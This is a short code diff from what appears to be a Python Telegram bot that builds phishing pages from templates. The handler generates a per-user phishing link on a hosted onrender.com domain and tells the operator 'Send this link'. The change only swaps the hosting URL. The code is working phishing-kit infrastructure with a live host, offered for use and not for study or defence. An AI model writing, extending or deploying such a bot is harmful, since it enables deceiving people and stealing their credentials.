@@ -296,7 +296,7 @@ def handle_template_selection(message):
 
                 # Prepare the phishing page with the user_id
                 if prepare_phishing_page(index_dst, index_dst, user_id, template):
-                    phishing_url = f"https://notafish-1.onrender.com/phish/{user_id}"
+                    phishing_url = f"https://notafish.onrender.com/phish/{user_id}"
                     bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
                 else:
                     bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
